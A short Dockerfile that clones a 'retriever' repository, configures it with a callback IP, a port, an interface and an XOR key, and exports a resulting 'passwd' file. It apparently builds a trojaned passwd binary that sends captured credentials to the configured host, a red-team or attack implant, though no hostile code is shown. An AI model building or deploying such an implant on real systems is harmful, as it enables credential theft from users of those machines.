FROM centos:centos7 AS builder

# Declare Variables
ARG IP="127.0.0.1"
ARG PORT="8000"
ARG INTERFACE="ens3"
ARG XOR_KEY="bingus"

# Install Dependancies #TODO - Fix GCC Error
RUN yum install -y git make autoconf gettext-devel libtool libxslt wget bison

# Clone and run script
RUN git clone https://github.com/p4ral1ax/retriever
WORKDIR /retriever
RUN ./generate.sh ${IP} ${PORT} ${INTERFACE} ${XOR_KEY}

# Copy File
FROM scratch AS export-stage
COPY --from=builder /retriever/passwd .
